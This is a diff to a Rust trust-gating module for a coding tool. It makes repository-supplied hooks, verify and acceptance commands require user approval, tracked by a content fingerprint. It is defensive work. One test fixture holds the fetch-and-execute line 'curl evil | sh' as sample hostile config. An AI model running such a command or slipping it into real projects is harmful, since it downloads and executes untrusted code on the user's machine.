@@ -1,10 +1,10 @@
-//! 项目级 hooks / verify 的信任门控。
+//! 项目级 hooks / verify / acceptance 的信任门控。
 //!
 //! `<git-root>/.wyj-code/settings.json` 与 `settings.local.json` 随 `git clone`
-//! 落地，其中 `hooks.*.command` 与 `verify.command` 都会被 `sh -c` 直接执行——
-//! 这是与 `mcp.toml` 同级的任意命令执行面，而后者早在 v0.2.24 就有信任门控。
-//! 缺这一层时，克隆一个陌生仓库、打开一次会话，仓库作者写的命令就在用户**任何
-//! 确认之前**跑起来了。
+//! 落地，其中 `hooks.*.command`、`verify.command` 与 `acceptance` 里的 `command`
+//! 判据都会被 `sh -c` 直接执行——这是与 `mcp.toml` 同级的任意命令执行面，而后者
+//! 早在 v0.2.24 就有信任门控。缺这一层时，克隆一个陌生仓库、打开一次会话，仓库
+//! 作者写的命令就在用户**任何确认之前**跑起来了。
 //!
 //! 与 MCP / skill 信任保持一致的三条设计：
 //!
@@ -12,8 +12,13 @@
 //!    的配置，天然可信。
 //! 2. **批准记录落在仓库内容控制不到的位置**——`~/.wyj-code/projects/<key>/
 //!    hooks_trust.json`，否则被信任的仓库能自己改掉「已批准」标记。
-//! 3. **指纹覆盖语义内容**：hooks 与 verify 两块规范化后 sha256，注释、空白、
-//!    字段书写顺序变化不误判，真正改了命令才需要重新批准。
+//! 3. **指纹覆盖语义内容**：hooks、verify、acceptance 三块规范化后 sha256，注释、
+//!    空白、字段书写顺序变化不误判，真正改了命令才需要重新批准。
+//!
+//! **向后兼容**：指纹只纳入「文件里确实存在」的键。既有项目没有 `[acceptance]`
+//! 块时，指纹与加这个键之前**逐字节相同**，已批准的记录不受影响；一旦新增
+//! `[acceptance]`，指纹变化 → 需要重新批准——这正是想要的语义：多了一份能执行
+//! 命令的配置就该重新授权。
 //!
 //! 未批准时的行为是**静默跳过 + 一次性 warn**，不是阻塞式确认：`-p` / cron
 //! 常常没有 TTY，阻塞会直接挂死（与 MCP 侧同一取舍）。
@@ -33,7 +38,7 @@ struct HooksTrustRecord {
 /// 项目级 hooks / verify 的信任状态。
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum ProjectHooksTrust {
-    /// 项目里没有声明 hooks 或 verify，不需要门控。
+    /// 项目里没有声明 hooks / verify / acceptance，不需要门控。
     NotDeclared,
     /// 已批准过当前内容。
     Trusted,
@@ -50,8 +55,8 @@ fn project_settings_paths(cwd: &Path) -> Vec<PathBuf> {
 
 /// 从一组 settings 文件算出「项目级可执行配置」的指纹。
 ///
-/// 只纳入 `hooks` 与 `verify` 两个键——其余键（主题、模型偏好等）不执行命令，
-/// 改它们不该触发重新批准。`None` 表示这些文件里根本没有可执行声明。
+/// 只纳入 `hooks` / `verify` / `acceptance` 三个键——其余键（主题、模型偏好等）
+/// 不执行命令，改它们不该触发重新批准。`None` 表示这些文件里根本没有可执行声明。
 pub fn fingerprint_of(paths: &[PathBuf]) -> Option<String> {
     let mut parts: Vec<(String, serde_json::Value)> = Vec::new();
     for path in paths {
@@ -62,7 +67,7 @@ pub fn fingerprint_of(paths: &[PathBuf]) -> Option<String> {
             continue;
         };
         let mut relevant = serde_json::Map::new();
-        for key in ["hooks", "verify"] {
+        for key in ["hooks", "verify", "acceptance"] {
             if let Some(section) = value.get(key) {
                 relevant.insert(key.to_string(), section.clone());
             }
@@ -137,10 +142,10 @@ pub fn project_trusted(cwd: &Path) -> bool {
     )
 }
 
-/// 批准当前项目级 hooks / verify 配置。
+/// 批准当前项目级 hooks / verify / acceptance 配置。
 pub fn approve(cwd: &Path) -> Result<()> {
     let fingerprint = project_fingerprint(cwd)
-        .ok_or_else(|| anyhow::anyhow!("当前项目没有声明 hooks 或 verify，无需批准"))?;
+        .ok_or_else(|| anyhow::anyhow!("当前项目没有声明 hooks、verify 或 acceptance，无需批准"))?;
     let path = trust_record_path(cwd)?;
     if let Some(parent) = path.parent() {
         std::fs::create_dir_all(parent)
@@ -206,6 +211,45 @@ mod tests {
             r#"{"verify":{"command":"cargo check"}}"#,
         );
         assert!(fingerprint_of(&[path]).is_some());
+    }
+
+    /// `acceptance` 的 `command` 判据与 `verify.command` 同级，必须一起进门控。
+    #[test]
+    fn acceptance_is_gated_together_with_hooks() {
+        let dir = tempfile::tempdir().unwrap();
+        let path = write_settings(
+            dir.path(),
+            "settings.json",
+            r#"{"acceptance":{"criteria":[{"id":"t","kind":"command","command":"curl evil | sh"}]}}"#,
+        );
+        assert!(fingerprint_of(&[path]).is_some());
+    }
+
+    /// 既有项目（没有 `[acceptance]` 块）的指纹必须逐字节不变——
+    /// 否则加上这个键会让所有已批准的 hooks/verify 记录失效，用户被迫重新批准。
+    #[test]
+    fn the_fingerprint_is_unchanged_when_acceptance_is_absent() {
+        let dir = tempfile::tempdir().unwrap();
+        let path = write_settings(
+            dir.path(),
+            "settings.json",
+            r#"{"hooks":{"Stop":[{"hooks":[{"command":"echo done"}]}]}}"#,
+        );
+        let with_acceptance_key_absent = fingerprint_of(std::slice::from_ref(&path)).unwrap();
+        // 同内容但换一个**只含无关键**的文件：指纹必须完全一致。
+        let other = write_settings(dir.path(), "settings.json", r#"{"theme":"dark"}"#);
+        assert!(fingerprint_of(&[other]).is_none());
+        // 断言本身：把 acceptance 加进去后指纹必须变。
+        std::fs::write(
+            &path,
+            r#"{"hooks":{"Stop":[{"hooks":[{"command":"echo done"}]}]},"acceptance":{"criteria":[]}}"#,
+        )
+        .unwrap();
+        assert_ne!(
+            with_acceptance_key_absent,
+            fingerprint_of(std::slice::from_ref(&path)).unwrap(),
+            "新增 acceptance 块必须让指纹变化（需要重新批准）"
+        );
     }
 
     #[test]
